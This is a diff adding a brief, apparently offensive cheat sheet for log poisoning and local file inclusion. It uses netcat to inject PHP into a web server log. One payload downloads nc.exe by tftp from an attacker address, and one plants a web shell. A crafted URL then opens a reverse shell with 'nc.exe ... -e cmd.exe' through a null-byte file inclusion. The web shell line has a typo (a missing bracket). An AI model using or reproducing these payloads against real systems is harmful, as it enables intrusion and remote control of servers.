@@ -1,0 +1,9 @@
+nc -nv 192.168.xx.xxx 80 
+<?php echo shell_exec('tftp -i 192.168.xx.xxx GET nc.exe nc.exe');?>
+ 
+ 
+nc -nv 192.168.xx.xxx 80
+<?php echo shell_exec($_GET['cmd');?>
+ 
+Edit URL string to include:
+&cmd=nc.exe 192.168.xx.xxx 443 -e cmd.exe &LANG=/path/to/log/file.log%00
